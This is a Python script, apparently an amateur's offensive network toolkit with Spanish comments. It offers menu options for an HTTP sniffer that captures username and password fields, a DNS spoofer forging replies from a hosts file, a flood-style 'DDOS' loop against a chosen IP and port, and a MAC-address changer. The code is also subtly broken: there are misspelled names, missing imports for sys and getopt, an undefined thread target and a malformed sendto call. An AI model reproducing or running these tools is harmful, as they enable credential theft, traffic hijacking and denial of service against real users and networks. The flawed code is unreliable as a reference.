import scapy.all as scapy
from scapy.layers import http
import netfilterqueue
import socket
import threading
import subprocess
import os 
from time import sleep 
import random 
#https://www.youtube.com/watch?v=5-IRImDXjjc EN EL MINUTO 2:21:59 (spoofer snifeer
log = ""
def sniffer():
    def sniff(interface):
        scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

    def get_url(packet):
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequesst].Path
    def get_login_info(packet):
        if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load
                keywords = ["username" , "user" , "login" , "password" , "pass"]
                for keyword in keywords:
                    if keyword in load:
                        return load 
    def process_sniffed_packet(packet):
        if packet.haslayer(http.HTTPRequest):
            url = get_url(packet)
            print("[+] HTTP Request >>>" + url)

            login_info = get_login_info(packet)
            if login_info:
                print("\n\n[+] Usuario y Contraseña Posibles >"+ login_Info + "\n\n")

    sniff("eth0")
def DNSspoofer():
    dev = "enp3s0f1"
    filter = "udp port 53"
    file = None
    dns_map = {}

    def handle_packet(packet):
        ip = packet.getlayer(scapy.IP)
        udp = packet.getlayer(scapy.UDP)
        dns = packet.getlayer(scapy.DNS)

       # standard (a record) dns query
        if dns.qr == 0 and dns.opcode == 0:
            queried_host = dns.qd.qname[:-1].decode()
            resolved_ip = None

            if dns_map.get(queried_host):
                resolved_ip = dns_map.get(queried_host)
            elif dns_map.get('*'):
                resolved_ip = dns_map.get('*')

            if resolved_ip:
                dns_answer = scapy.DNSRR(rrname=queried_host + ".",
                                         ttl=330,
                                         type="A",
                                         rclass="IN",
                                     rdata=resolved_ip)

                dns_reply = scapy.IP(src=ip.dst, dst=ip.src) / \
                            scapy.UDP(sport=udp.dport,
                                      dport=udp.sport) / \
                            scapy.DNS(
                                id = dns.id,
                                qr = 1,
                                aa = 0,
                                rcode = 0,
                                qd = dns.qd,
                                an = dns_answer
                            )

                print("Send %s has %s to %s" % (queried_host,
                                                resolved_ip,
                                                ip.src))
                scapy.send(dns_reply, iface=dev)


    def usage():
        print(sys.argv[0] + " -f <hosts-file> -i <dev>")
        sys.exit(1)


    def parse_host_file(file):
        for line in open(file):
            line = line.rstrip('\n')

            if line:
                (ip, host) = line.split()
                dns_map[host] = ip

    try:
        cmd_opts = "f:i:"
        opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
    except getopt.GetoptError:
        usage()

    for opt in opts:
        if opt[0] == "-i":
            dev = opt[1]
        elif opt[0] == "-f":
            file = opt[1]
        else:
            usage()

    if file:
        parse_host_file(file)
    else:
        usage()

    print("Spoofing DNS requests on %s" % (dev))
    scapy.sniff(iface=dev, filter=filter, prn=handle_packet)
def DDOS():
    ip = input("IP:")
    port = input("PUERTO:")
    hilos = input("Nº hilos>")
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.sendto(('GET /' + ip + ' HTTP/1.1\r\n').encode('ascii', (ip, port)))
         

    for _ in range(hilos):
        thread = threading.Thread(target=attack)
        thread.start()
def changeMAC():
    print("Example of MAC>6F:72:8X:79:66:4E")
    MAC = input ("enter new MAC:")
    subprocess.call("ifconfig eth0 down", shell=True)
    subprocess.call("ifconfig eth0 hw ether" +MAC+ "", shell=True)
    subprocess.call("ifconfig eth0 up", shell=True)


input = input(">")
if input == "DNSpoofer":
    DNSspoofer()
if input == "sniffer":
    sniffer()
if input == "DDos":
    DDOS()
if input == "MAC":
    changeMAC()

